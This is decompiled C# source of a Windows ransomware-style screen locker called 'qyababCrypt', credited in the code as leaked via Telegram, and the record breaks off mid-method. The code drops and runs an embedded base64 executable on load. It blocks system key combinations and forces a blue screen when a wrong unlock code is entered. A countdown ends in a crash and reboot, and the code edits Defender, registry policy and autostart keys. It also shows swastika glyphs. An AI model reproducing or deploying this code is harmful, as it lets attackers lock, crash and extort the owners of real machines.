using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x0200001A RID: 26
	[DesignerGenerated]
	public partial class gui : Form
	{
		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000041 RID: 65 RVA: 0x00003354 File Offset: 0x00001554
		// (set) Token: 0x06000042 RID: 66 RVA: 0x0000336C File Offset: 0x0000156C
		public virtual Label tg
		{
			[CompilerGenerated]
			get
			{
				return this.label_12;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.method_13);
				Label label = this.label_12;
				bool flag = label != null;
				if (flag)
				{
					label.Click -= eventHandler;
				}
				this.label_12 = value;
				label = this.label_12;
				bool flag2 = label != null;
				if (flag2)
				{
					label.Click += eventHandler;
				}
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000033BC File Offset: 0x000015BC
		public gui()
		{
			base.Load += this.GForm2_Load;
			base.KeyDown += this.GForm2_KeyDown;
			base.FormClosing += this.GForm2_FormClosing;
			this.string_0 = " ";
			this.object_0 = 0;
			this.object_1 = 0;
			this.object_2 = 0;
			this.object_3 = false;
			this.object_4 = 0;
			this.InitializeComponent();
			try
			{
				bool flag = DeadlineManager.IsTimeEnded();
				if (flag)
				{
					base.Opacity = 0.0;
					base.ShowInTaskbar = false;
					base.WindowState = FormWindowState.Minimized;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000044 RID: 68
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int LockWorkStation();

		// Token: 0x06000046 RID: 70 RVA: 0x000034A4 File Offset: 0x000016A4
		private void method_0(object sender, EventArgs e)
		{
			gui.SetForegroundWindow(base.Handle.ToInt32());
			try
			{
				this.hdn.Focus();
				Label label = this.art;
				bool flag = Operators.ConditionalCompareObjectLess(this.object_0, 200, false);
				if (flag)
				{
					bool flag2 = !Operators.ConditionalCompareObjectLess(this.object_0, 10, false);
					if (flag2)
					{
						bool flag3 = !Operators.ConditionalCompareObjectLess(this.object_0, 18, false);
						if (flag3)
						{
							bool flag4 = Operators.ConditionalCompareObjectEqual(this.object_0, 30, false);
							if (flag4)
							{
								Label label2 = label;
								label2.Text += "\r\nCreator: @clanpidori | Leaked in t.me/asmdecompiler";
							}
							else
							{
								bool flag5 = !Operators.ConditionalCompareObjectEqual(this.object_0, 35, false);
								if (flag5)
								{
									bool flag6 = !Operators.ConditionalCompareObjectEqual(this.object_0, 50, false);
									if (flag6)
									{
										bool flag7 = Operators.ConditionalCompareObjectEqual(this.object_0, 70, false);
										if (flag7)
										{
											label.Image = null;
											label.Text = null;
										}
										else
										{
											bool flag8 = Operators.ConditionalCompareObjectEqual(this.object_0, 80, false);
if (flag8)
{
    label.BackColor = Color.Magenta;
    label.ForeColor = Color.Black;
    Label label3 = label;
    label3.Text += "⣿⣿⠏⠄⣰⣿⡋⡴⣁⣿⣿⣿⣿⣯⡖⣄⠘⢿⣆⠄⠄⠄⠈⢻⣿⣿⣿⣿";
    Label label4 = label;
    label4.Text += "\r\n⣿⠇⠂⣴⡿⡃⡜⡰⣾⣿⣿⣿⣿⣿⣟⠸⢠⠸⣿⡆⠄⠄⠄⠄⠹⣿⣿⣿";
    Label label5 = label;
    label5.Text += "\r\n⡟⢀⢠⡿⡝⡌⣼⣻⣿⣿⣿⣿⣿⣿⣿⡄⠄⡆⣿⡇⠄⠄⠄⠄⠄⢿⣿⣿";
    Label label6 = label;
    label6.Text += "\r\n⡇⡏⣸⣷⣳⣹⡿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⣷⣿⡇⠄⠄⠄⠄⠄⠸⣿⣿";
    Label label7 = label;
    label7.Text += "\r\n⣿⣧⠿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠻⢿⣿⣿⣦⡸⣿⣷⠄⠄⠄⠄⠄⠄⢻⣿";
    Label label8 = label;
    label8.Text += "\r\n⣿⡡⠦⣄⡹⣿⣿⣿⣿⠃⢠⣶⣶⣦⡌⢿⣿⣿⣾⣿⡆⠄⠄⠄⠄⠄⢸⣿";
    Label label9 = label;
    label9.Text += "\r\n⣿⣇⠄⣿⡇⣿⣿⣿⣿⡀⠊⠄⢸⣿⡿⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⣿";
    Label label10 = label;
    label10.Text += "\r\n⣿⣿⣝⣋⣠⣿⣿⣿⣿⣧⡈⠒⠚⢛⣡⣾⣿⣿⣿⣿⠇⠄⠄⠄⠄⠄⠠⢻";
    Label label11 = label;
    label11.Text += "\r\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣽⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⠄⢘⢻";
    Label label12 = label;
    label12.Text += "\r\n⣿⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠄⠄⠄⠄⠄⠄⠈⣿";
    Label label13 = label;
    label13.Text += "\r\n⣿⡷⠄⢿⣿⣹⣯⣽⣿⣿⣿⣿⣿⣿⣿⣿⠟⣫⡶⡀⠄⠄⠄⠄⠄⠄⠄⣿";
    Label label14 = label;
    label14.Text += "\r\n⣿⡟⡀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣡⣾⣿⡕⠁⠄⠄⠄⠄⠄⠄⠄⣿";
    Label label15 = label;
    label15.Text += "\r\n⣿⡟⡅⠄⠘⣿⣿⣿⣿⡿⠟⠋⣡⣴⣿⣿⣿⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿";
    Label label16 = label;
    label16.Text += "\r\n⣿⣷⡇⠄⠄⠘⢯⣍⣡⣤⣶⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿";
    Label label17 = label;
    label17.Text += "\r\n⣿⣿⡇⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣟⣡⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿";
    this.method_9();
}
											else
											{
												bool flag9 = !Operators.ConditionalCompareObjectEqual(this.object_0, 140, false);
												if (flag9)
												{
													bool flag10 = !Operators.ConditionalCompareObjectEqual(this.object_0, 150, false);
													if (flag10)
													{
														bool flag11 = !Operators.ConditionalCompareObjectEqual(this.object_0, 160, false);
														if (flag11)
														{
															bool flag12 = Operators.ConditionalCompareObjectEqual(this.object_0, 170, false);
															if (flag12)
															{
																this.UserInfo.Visible = true;
															}
															else
															{
																bool flag13 = !Operators.ConditionalCompareObjectEqual(this.object_0, 177, false);
																if (flag13)
																{
																	bool flag14 = Operators.ConditionalCompareObjectEqual(this.object_0, 180, false);
																	if (flag14)
																	{
																		this.ID.Visible = true;
																	}
																}
																else
																{
																	this.menu1.Visible = true;
																}
															}
														}
														else
														{
															this.a2.Visible = true;
														}
													}
													else
													{
														this.a1.Visible = true;
													}
												}
												else
												{
													this.BackColor = Color.Black;
													this.main.Visible = true;
													this.UpdateDeadlineTimer();
												}
											}
										}
									}
									else
									{
										label.ForeColor = Color.Magenta;
										Label label39 = label;
										label39.Text += "\r\n\r\n     * system locked";
									}
								}
								else
								{
									Label label40 = label;
									label40.Text += "\n\nqyabab lock xd :3";
								}
							}
						}
						else
						{
							Label label41;
							(label41 = label).Text = Conversions.ToString(Operators.ConcatenateObject(label41.Text, Operators.ConcatenateObject("\r\nXDWD: 0x0", Operators.IntDivideObject(Conversion.Int(Conversion.Str(VBMath.Rnd()).Replace(".", "").Trim()), 2))));
						}
					}
					else
					{
						label.Text = null;
						label.Text = "Hello qyabab!";
					}
				}
				this.object_0 = Operators.AddObject(this.object_0, 1);
				this.hdn.SelectionStart = Strings.Len(this.hdn.Text);
				try
				{
					bool flag15 = this.hdn.Text != null && this.string_0 != null;
					if (flag15)
					{
						this.inputPS.Text = this.hdn.Text + this.string_0;
					}
					else
					{
						this.inputPS.Text = this.hdn.Text ?? "";
					}
				}
				catch
				{
					this.inputPS.Text = "";
				}
				Cursor.Position = new Point(5, 5);
				base.Activate();
			}
			catch
			{
			}
			try
			{
				bool flag16 = Operators.ConditionalCompareObjectGreaterEqual(this.object_0, 200, false);
				if (flag16)
				{
					bool flag17 = Operators.ConditionalCompareObjectEqual(Operators.ModObject(this.object_0, 250), 0, false);
					if (flag17)
					{
						this.UpdateDeadlineTimer();
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00003CC8 File Offset: 0x00001EC8
		private void method_1(object sender, EventArgs e)
		{
			ref object ptr = ref this.object_1;
			ptr = Operators.AddObject(ptr, 1);
			string[] array = new string[] { "卐", "卍", "卐", "卍", "卐" };
			object obj = this.object_1;
			bool flag = !Operators.ConditionalCompareObjectEqual(obj, 1, false);
			if (flag)
			{
				bool flag2 = !Operators.ConditionalCompareObjectEqual(obj, 34, false);
				if (flag2)
				{
					bool flag3 = !Operators.ConditionalCompareObjectEqual(obj, 37, false);
					if (flag3)
					{
						bool flag4 = !Operators.ConditionalCompareObjectEqual(obj, 40, false);
						if (flag4)
						{
							bool flag5 = !Operators.ConditionalCompareObjectEqual(obj, 42, false);
							if (flag5)
							{
								bool flag6 = Operators.ConditionalCompareObjectEqual(obj, 60, false);
								if (flag6)
								{
									this.object_1 = 0;
								}
							}
							else
							{
								this.string_0 = array[4];
							}
						}
						else
						{
							this.string_0 = array[3];
						}
					}
					else
					{
						this.string_0 = array[2];
					}
				}
				else
				{
					this.string_0 = array[1];
				}
			}
			else
			{
				this.string_0 = array[0];
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003E08 File Offset: 0x00002008
		private void method_2(object sender, EventArgs e)
		{
			try
			{
				this.inputPS.Text = this.hdn.Text ?? "";
			}
			catch
			{
				this.inputPS.Text = "";
			}
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003E60 File Offset: 0x00002060
		private void GForm2_Load(object sender, EventArgs e)
		{
			try
			{
				try
				{
					new Thread(new ThreadStart(this.PlayAudioLoop))
					{
						IsBackground = true
					}.Start();
				}
				catch
				{
				}
				bool flag = DeadlineManager.IsTimeEnded();
				if (flag)
				{
					base.Opacity = 0.0;
					base.ShowInTaskbar = false;
					base.WindowState = FormWindowState.Minimized;
					base.Hide();
					DeadlineManager.ExecuteFinalPayload();
					return;
				}
			}
			catch
			{
			}
			try
			{
				DeadlineManager.Initialize();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion");
				bool flag2 = registryKey != null;
				if (flag2)
				{
					object value = registryKey.GetValue("BypassAttempts");
					bool flag3 = value != null;
					if (flag3)
					{
						this.bypass_attempts = (int)value;
					}
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				byte[] array = Convert.FromBase64String(Payload.Base64Payload);
				string text = Path.GetTempFileName().Replace(".tmp", ".exe");
				File.WriteAllBytes(text, array);
				Process.Start(text);
			}
			catch
			{
			}
			this.Text = "qyababCrypt";
			Class1.MyForms_0.loader.Text = "qyabab [Runtime]";
			try
			{
				this.ID.Text = Conversions.ToString(Operators.ConcatenateObject("ID: 34-R" + File.ReadAllText(Class1.MyForms_0.loader.string_4) + "6E", Operators.MultiplyObject(Conversion.Int(File.ReadAllText(Class1.MyForms_0.loader.string_4)), 2)));
			}
			catch
			{
				Class1.MyForms_0.loader.object_0 = true;
			}
			this.Cursor.Dispose();
			this.hdn.ContextMenu = new ContextMenu();
			this.BackColor = Color.Black;
			this.UserInfo.Text = "Current PC: " + Class1.Class0_0.Name;
			this.UpdateDeadlineTimer();
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000040B4 File Offset: 0x000022B4
		private void PlayAudioLoop()
		{
			try
			{
				string text = "";
				using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ns0.firstaudio.txt"))
				{
					bool flag = manifestResourceStream != null;
					if (flag)
					{
						using (StreamReader streamReader = new StreamReader(manifestResourceStream))
						{
							text = streamReader.ReadToEnd();
						}
					}
				}
				bool flag2 = !string.IsNullOrEmpty(text);
				if (flag2)
				{
					using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(text)))
					{
						using (SoundPlayer soundPlayer = new SoundPlayer(memoryStream))
						{
							soundPlayer.PlaySync();
						}
					}
				}
				string text2 = "";
				using (Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("ns0.lastaudio.txt"))
				{
					bool flag3 = manifestResourceStream2 != null;
					if (flag3)
					{
						using (StreamReader streamReader2 = new StreamReader(manifestResourceStream2))
						{
							text2 = streamReader2.ReadToEnd();
						}
					}
				}
				bool flag4 = !string.IsNullOrEmpty(text2);
				if (flag4)
				{
					using (MemoryStream memoryStream2 = new MemoryStream(Convert.FromBase64String(text2)))
					{
						using (SoundPlayer soundPlayer2 = new SoundPlayer(memoryStream2))
						{
							soundPlayer2.PlayLooping();
							while (!gui.stopAudio)
							{
								Thread.Sleep(500);
							}
							soundPlayer2.Stop();
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00004318 File Offset: 0x00002518
		private void GForm2_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.hdn.Text, "CtrlAltAllowed", false) != 0 && (e.Control & e.Alt);
				if (flag)
				{
					this.method_10();
					this.ByPassMessage.Visible = true;
					this.vmethod_8().Start();
					gui.LockWorkStation();
					e.Handled = true;
				}
				bool flag2 = e.Alt && e.KeyCode == Keys.Tab;
				if (flag2)
				{
					this.method_10();
					this.ByPassMessage.Visible = true;
					this.vmethod_8().Start();
					e.Handled = true;
				}
				bool flag3 = e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin;
				if (flag3)
				{
					this.method_10();
					this.ByPassMessage.Visible = true;
					this.vmethod_8().Start();
					e.Handled = true;
				}
			}
			catch
			{
			}
			try
			{
				bool flag4 = e.KeyCode == Keys.Return;
				if (flag4)
				{
					Label label = this.menu1;
					label.BackColor = Color.White;
					label.ForeColor = Color.Black;
					bool flag5 = string.IsNullOrEmpty(this.hdn.Text);
					if (flag5)
					{
						return;
					}
					bool flag6 = Interaction.Command().Contains("debug") && Operators.CompareString(this.hdn.Text, "123", false) == 0;
					if (flag6)
					{
						ProjectData.EndApp();
					}
					bool flag7 = Operators.CompareString(this.hdn.Text, "8404753607", false) == 0;
					if (flag7)
					{
						this.method_5();
					}
					else
					{
						try
						{
							string text = "0e4b0y" + File.ReadAllText(Class1.MyForms_0.loader.string_4);
							bool flag8 = Operators.CompareString(this.hdn.Text, text, false) == 0;
							if (flag8)
							{
								this.method_5();
							}
							else
							{
								this.errx.Visible = true;
								this.errx.Text = "Введённый код не совпадает с кодом разблокировки!";
								this.keytext.ForeColor = Color.HotPink;
								Application.DoEvents();
								Thread.Sleep(1000);
								this.TriggerBSOD();
							}
						}
						catch
						{
							Class1.MyForms_0.loader.object_0 = true;
							this.vmethod_4().Start();
							this.errx.Text = "Произошёл сбой! Обратитесь за аварийным кодом.";
						}
					}
				}
			}
			catch
			{
			}
			bool flag9 = Conversions.ToBoolean(Class1.MyForms_0.loader.object_0);
			if (flag9)
			{
				bool flag10 = Operators.CompareString(this.hdn.Text, "ExceptionKey", false) == 0;
				if (flag10)
				{
					this.method_5();
					ProjectData.EndApp();
				}
			}
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000021C7 File Offset: 0x000003C7
		private void method_3(object sender, KeyPressEventArgs e)
		{
			this.object_1 = 0;
			e.Handled = !char.IsLetterOrDigit(e.KeyChar) && e.KeyChar != '\b';
		}

		// Token: 0x0600004D RID: 77 RVA: 0x0000463C File Offset: 0x0000283C
		private void method_4(object sender, EventArgs e)
		{
			this.errx.Visible = true;
			ref object ptr = ref this.object_2;
			ptr = Operators.AddObject(ptr, 1);
			object obj = this.object_2;
			bool flag = Operators.ConditionalCompareObjectEqual(obj, 3, false);
			if (flag)
			{
				this.keytext.ForeColor = Color.HotPink;
			}
			else
			{
				bool flag2 = Operators.ConditionalCompareObjectEqual(obj, 5, false);
				if (flag2)
				{
					this.keytext.ForeColor = Color.Magenta;
				}
				else
				{
					bool flag3 = Operators.ConditionalCompareObjectEqual(obj, 6, false);
					if (flag3)
					{
						this.keytext.ForeColor = Color.HotPink;
					}
					else
					{
						bool flag4 = Operators.ConditionalCompareObjectEqual(obj, 7, false);
						if (flag4)
						{
							this.object_3 = false;
							this.errx.Visible = false;
							this.keytext.ForeColor = Color.Magenta;
							this.vmethod_4().Stop();
							this.object_2 = 0;
						}
					}
				}
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004744 File Offset: 0x00002944
		public void method_5()
		{
			ns0.main._stopEncryption = true;
			this.keytext.Text = "Подождите...";
			this.keytext.ForeColor = Color.HotPink;
			Application.DoEvents();
			try
			{
				string text = Path.Combine(Path.GetTempPath(), "$qyababcrypt_decryption_in_progress.flag");
				File.WriteAllText(text, DateTime.Now.ToString());
				File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
			try
			{
				string tempPath = Path.GetTempPath();
				string text2 = Path.Combine(tempPath, "restore_system.bat");
				string text3 = Path.Combine(tempPath, "restore_runner.vbs");
				string text4 = "@echo off\r\ntitle System Restoration - DO NOT CLOSE\r\necho Please wait while we restore your system protection...\r\ntaskkill /f /im svchost32.exe >nul 2>&1\r\nattrib -r -s -h %SystemRoot%\\system32\\drivers\\etc\\svchost32.exe >nul 2>&1\r\ndel /q /f %SystemRoot%\\system32\\drivers\\etc\\svchost32.exe >nul 2>&1\r\ndel /q /f %SystemRoot%\\system32\\drivers\\etc\\*\r\npowershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisableBehaviorMonitoring $false; Start-Service WinDefend; Start-Service wscsvc\"\r\ndel /q /f \"%TEMP%\\qyabab.png\"\r\necho MsgBox \"Your pc successfully unlocked! GoodLuck!\", 64, \"qyabab\" > \"%TEMP%\\unlocked.vbs\"\r\nstart \"\" \"%TEMP%\\unlocked.vbs\"\r\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"CatRestorer\" /f\r\ntimeout /t 5 >nul\r\ndel \"%TEMP%\\unlocked.vbs\"\r\ndel \"%TEMP%\\restore_runner.vbs\"\r\n(goto) 2>nul & del \"%~f0\"";
				string text5 = "Set WshShell = CreateObject(\"WScript.Shell\")\r\nWshShell.Run \"cmd.exe /c \"\"" + text2 + "\"\"\", 0, False";
				File.WriteAllText(text2, text4);
				File.WriteAllText(text3, text5);
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						registryKey.SetValue("CatRestorer", "wscript.exe \"" + text3 + "\"");
					}
				}
			}
			catch
			{
			}
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					try
					{
						foreach (Process process in Process.GetProcessesByName("explorer"))
						{
							try
							{
								process.Kill();
								process.WaitForExit(2000);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
					string[] array = new string[]
					{
						"explorer.exe", "sihost.exe", "cmd.exe", "powershell.exe", "pwsh.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "gpedit.msc", "devmgmt.msc",
						"diskmgmt.msc", "compmgmt.msc", "services.msc", "eventvwr.exe", "perfmon.exe", "mmc.exe", "taskschd.msc", "control.exe", "resmon.exe"
					};
					foreach (string text6 in array)
					{
						try
						{
							using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true))
							{
								bool flag2 = registryKey2 != null;
								if (flag2)
								{
									registryKey2.DeleteSubKeyTree(text6, false);
								}
							}
						}
						catch
						{
						}
						try
						{
							using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", true))
							{
								bool flag3 = registryKey3 != null;
								if (flag3)
								{
									registryKey3.DeleteSubKeyTree(text6, false);
								}
							}
						}
						catch
						{
						}
					}
					try
					{
						using (RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
						{
							bool flag4 = registryKey4 != null;
							if (flag4)
							{
								registryKey4.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
								try
								{
									registryKey4.DeleteValue("AutoRestartShell");
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
					string[] array3 = new string[] { "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" };
					string[] array4 = new string[] { "DisableTaskMgr", "DisableCMD", "DisableRegistryTools", "NoRun", "NoClose", "NoLogoff" };
					foreach (string text7 in array3)
					{
						try
						{
							using (RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey(text7, true))
							{
								bool flag5 = registryKey5 != null;
								if (flag5)
								{
									foreach (string text8 in array4)
									{
										try
										{
											registryKey5.DeleteValue(text8);
										}
										catch
										{
										}
									}
								}
							}
						}
						catch
						{
						}
						try
						{
							using (RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey(text7, true))
							{
								bool flag6 = registryKey6 != null;
								if (flag6)
								{
									foreach (string text9 in array4)
									{
										try
										{
											registryKey6.DeleteValue(text9);
										}
										catch
										{
										}
									}
								}
							}
						}
						catch
						{
						}
					}
					try
					{
						using (RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WindowsPowerShell", true))
						{
							bool flag7 = registryKey7 != null;
							if (flag7)
							{
								try
								{
									registryKey7.DeleteValue("EnableScripts");
								}
								catch
								{
								}
								try
								{
									registryKey7.DeleteValue("DisableCommandLine");
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
					foreach (string text10 in new string[] { "USBSTOR", "cdrom" })
					{
						try
						{
							using (RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\" + text10, true))
							{
								bool flag8 = registryKey8 != null;
								if (flag8)
								{
									registryKey8.SetValue("Start", 3, RegistryValueKind.DWord);
								}
							}
						}
						catch
						{
						}
					}
					try
					{
						using (RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", true))
						{
							bool flag9 = registryKey9 != null;
							if (flag9)
							{
								foreach (string text11 in new string[] { "Minimal", "Network" })
								{
									try
									{
										registryKey9.CreateSubKey(text11);
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
					try
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd.exe",
							Arguments = "/c bcdedit /set {default} recoveryenabled Yes & bcdedit /set {default} bootstatuspolicy DisplayAllFailures",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						});
					}
					catch
					{
					}
					Unlock.DoFullUnlock(Class1.MyForms_0.loader);
					int i2;
					int i;
					for (i = 30; i > 0; i = i2 - 1)
					{
						try
						{
							base.Invoke(new Action(delegate
							{
								this.keytext.Text = "Разблокировка успешна! Подождите " + i.ToString() + " с...";
							}));
						}
						catch
						{
						}
						Thread.Sleep(1000);
						i2 = i;
					}
					try
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "shutdown",
							Arguments = "/r /f /t 0",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true
						});
					}
					catch
					{
						try
						{
							Process.Start(new ProcessStartInfo
							{
								FileName = "cmd.exe",
								Arguments = "/c shutdown /r /f /t 0",
								WindowStyle = ProcessWindowStyle.Hidden,
								CreateNoWindow = true
							});
						}
						catch
						{
						}
					}
				}
				catch
				{
					try
					{
						Process.Start("shutdown", "/r /f /t 5");
					}
					catch
					{
					}
					Environment.Exit(0);
				}
			});
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004894 File Offset: 0x00002A94
		private void method_7(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				Label label = this.menu1;
				label.BackColor = Color.Black;
				this.keytext.ForeColor = Color.Magenta;
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000048D8 File Offset: 0x00002AD8
		public void method_8()
		{
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate
				{
					int num = 0;
					do
					{
						Console.Beep(900, 120);
						num++;
					}
					while (num <= 1);
				};
				new Thread(new ThreadStart(vb_0024AnonymousDelegate_.Invoke)).Start();
			}
			catch
			{
			}
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004938 File Offset: 0x00002B38
		public void method_9()
		{
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate
				{
					Console.Beep(1000, 950);
				};
				new Thread(new ThreadStart(vb_0024AnonymousDelegate_.Invoke)).Start();
			}
			catch
			{
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004998 File Offset: 0x00002B98
		public void method_10()
		{
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate
				{
					Console.Beep(650, 600);
				};
				new Thread(new ThreadStart(vb_0024AnonymousDelegate_.Invoke)).Start();
			}
			catch
			{
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000049F8 File Offset: 0x00002BF8
		private void TriggerBSOD()
		{
			try
			{
				try
				{
					uint num;
					gui.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
				}
				catch
				{
				}
				try
				{
					bool flag;
					gui.RtlAdjustPrivilege(19, true, false, out flag);
					uint num2;
					gui.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num2);
				}
				catch
				{
				}
				try
				{
					Process.EnterDebugMode();
					gui.RtlSetProcessIsCritical(1U, 0U, 0U);
					Environment.Exit(0);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000054 RID: 84
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);

		// Token: 0x06000055 RID: 85
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x06000056 RID: 86
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		// Token: 0x06000057 RID: 87 RVA: 0x00004AAC File Offset: 0x00002CAC
		private void CheckBypassAttempts()
		{
			try
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion");
					registryKey.SetValue("BypassAttempts", this.bypass_attempts, RegistryValueKind.DWord);
					registryKey.Close();
				}
				catch
				{
				}
				bool flag = this.bypass_attempts >= 3;
				if (flag)
				{
					try
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "shutdown",
							Arguments = "/r /t 0 /f",
							CreateNoWindow = true,
							UseShellExecute = false
						});
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004B74 File Offset: 0x00002D74
		private void UpdateDeadlineTimer()
		{
			try
			{
				TimeSpan remainingTime = TimerPayload.GetRemainingTime();
				bool flag = remainingTime.TotalSeconds <= 0.0;
				if (flag)
				{
					this.ExecuteDeadlinePayload();
				}
				else
				{
					int num = (int)remainingTime.TotalSeconds;
					int num2 = num / 5 * 5;
					int num3 = num2 / 3600;
					int num4 = num2 % 3600 / 60;
					int num5 = num2 % 60;
					string text = string.Format("{0:D2}:{1:D2}:{2:D2}", num3, num4, num5);
					bool flag2 = this.DeadlineTimer != null;
					if (flag2)
					{
						this.DeadlineTimer.Text = text;
						this.DeadlineTimer.Visible = true;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004C3C File Offset: 0x00002E3C
		private void ExecuteDeadlinePayload()
		{
			try
			{
				gui.stopAudio = true;
				Thread.Sleep(500);
				try
				{
					DeadlineManager.CreateTimeEndedFlag();
				}
				catch
				{
				}
				try
				{
					BSODPayload.TriggerBSOD();
				}
				catch
				{
				}
				try
				{
					Thread.Sleep(3000);
					Process.Start(new ProcessStartInfo
					{
						FileName = "shutdown",
						Arguments = "/r /f /t 0",
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					});
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005A RID: 90
		[DllImport("user32.dll")]
		public static extern int SetForegroundWindow(int int_0);

		// Token: 0x0600005B RID: 91 RVA: 0x000021F9 File Offset: 0x000003F9
		private void GForm2_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.vmethod_8().Start();
			e.Cancel = true;
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002210 File Offset: 0x00000410
		private void method_11(object sender, EventArgs e)
		{
			gui.mouse_event(2, 0, 0, 3, 3);
